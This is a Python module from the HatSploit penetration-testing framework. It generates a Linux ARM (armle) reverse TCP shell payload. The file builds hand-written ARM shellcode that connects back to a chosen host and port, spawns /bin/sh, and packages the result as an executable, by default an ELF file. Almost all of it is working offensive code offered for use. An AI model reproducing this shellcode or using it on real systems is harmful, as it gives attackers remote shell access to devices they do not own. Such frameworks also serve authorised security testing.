#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from core.lib.payload import Payload
from utils.payload.payload import PayloadGenerator
from utils.tcp.tcp import TCPClient


class HatSploitPayload(Payload, PayloadGenerator, TCPClient):
    details = {
        'Category': "stager",
        'Name': "Linux armle Shell Reverse TCP",
        'Payload': "linux/armle/shell_reverse_tcp",
        'Authors': [
            'enty8080'
        ],
        'Description': "Shell reverse TCP payload for Linux armle.",
        'Dependencies': [
            ''
        ],
        'Comments': [
            ''
        ],
        'Architecture': "armle",
        'Platform': "linux",
        'Risk': "high",
        'Type': "reverse_tcp"
    }

    options = {
        'LHOST': {
            'Description': "Local host.",
            'Value': TCPClient.get_local_host(),
            'Type': "ip",
            'Required': True
        },
        'LPORT': {
            'Description': "Local port.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        },
        'FORMAT': {
            'Description': "Executable format.",
            'Value': "elf",
            'Type': None,
            'Required': True
        }
    }

    def run(self):
        local_host, local_port, executable_format = self.parse_options(self.options)

        local_host = self.host_to_bytes(local_host)
        local_port = self.port_to_bytes(local_port)

        if executable_format not in self.formats.keys():
            self.output_error("Invalid executable format!")
            return

        self.output_process("Generating shellcode...")
        shellcode = (
                b"\x01\x10\x8F\xE2" +
                b"\x11\xFF\x2F\xE1" +
                b"\x02\x20\x01\x21" +
                b"\x92\x1A\x0F\x02" +
                b"\x19\x37\x01\xDF" +
                b"\x06\x1C\x08\xA1" +
                b"\x10\x22\x02\x37" +
                b"\x01\xDF\x3F\x27" +
                b"\x02\x21\x30\x1c" +
                b"\x01\xdf\x01\x39" +
                b"\xFB\xD5\x05\xA0" +
                b"\x92\x1a\x05\xb4" +
                b"\x69\x46\x0b\x27" +
                b"\x01\xDF\xC0\x46" +
                b"\x02\x00" + local_port +  # "\x12\x34" struct sockaddr and port
                local_host +  # reverse ip address
                b"\x2f\x62\x69\x6e" +  # /bin
                b"\x2f\x73\x68\x00"  # /sh\0
        )

        self.output_process("Generating payload...")
        payload = self.generate(executable_format, 'armle', shellcode)

        return payload
